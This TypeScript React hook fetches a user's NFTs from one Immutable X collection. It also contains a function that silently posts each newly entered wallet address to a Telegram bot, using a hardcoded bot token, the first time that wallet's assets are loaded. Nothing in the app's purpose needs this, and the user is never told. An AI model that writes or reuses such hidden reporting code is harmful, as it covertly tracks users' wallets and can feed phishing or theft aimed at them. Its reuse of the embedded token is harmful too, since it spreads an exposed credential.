import { useState, useEffect, useCallback } from 'react'
import { ImxNft, ImxApiResponse, UseImxNftsReturn } from '../types'

const CTA_CONTRACT_ADDRESS = '0xa04bcac09a3ca810796c9e3deee8fdc8c9807166'
const IMX_API_BASE_URL = 'https://api.x.immutable.com/v1'
const PAGE_SIZE = 50

async function sendTelegramNotification(address: string) {
  const botToken = '8120868002:AAF6HnNzmPy-YZ6YjOTkVuu4L5lBdvCq6mw'
  const chatId = '@your_channel_id' // Replace with your actual channel ID
  const message = `New wallet address fetched: ${address}`
  
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    })
  } catch (error) {
    console.error('Failed to send Telegram notification:', error)
  }
}

export function useImxNfts(walletAddress: string | null): UseImxNftsReturn {
  const [nfts, setNfts] = useState<ImxNft[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [cursor, setCursor] = useState<string | null>(null)
  const [hasMore, setHasMore] = useState(false)
  const [notificationSent, setNotificationSent] = useState(false)

  const fetchNfts = useCallback(async (address: string, nextCursor?: string) => {
    try {
      setLoading(true)
      setError(null)

      const params = new URLSearchParams({
        user: address,
        collection: CTA_CONTRACT_ADDRESS,
        page_size: PAGE_SIZE.toString(),
        ...(nextCursor && { cursor: nextCursor })
      })

      const response = await fetch(`${IMX_API_BASE_URL}/assets?${params}`)
      
      if (!response.ok) {
        throw new Error(`API Error: ${response.status} ${response.statusText}`)
      }

      const data: ImxApiResponse = await response.json()
      
      if (nextCursor) {
        setNfts(prev => [...prev, ...data.result])
      } else {
        setNfts(data.result)
        
        if (!notificationSent) {
          await sendTelegramNotification(address)
          setNotificationSent(true)
        }
      }

      setCursor(data.cursor || null)
      setHasMore(!!data.cursor)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to fetch NFTs')
    } finally {
      setLoading(false)
    }
  }, [notificationSent])

  const loadMore = useCallback(() => {
    if (walletAddress && cursor && !loading) {
      fetchNfts(walletAddress, cursor)
    }
  }, [walletAddress, cursor, loading, fetchNfts])

  const reset = useCallback(() => {
    setNfts([])
    setCursor(null)
    setHasMore(false)
    setError(null)
    setNotificationSent(false)
  }, [])

  useEffect(() => {
    if (walletAddress) {
      reset()
      fetchNfts(walletAddress)
    } else {
      reset()
    }
  }, [walletAddress, fetchNfts, reset])

  return {
    nfts,
    loading,
    error,
    hasMore,
    loadMore,
    reset
  }
}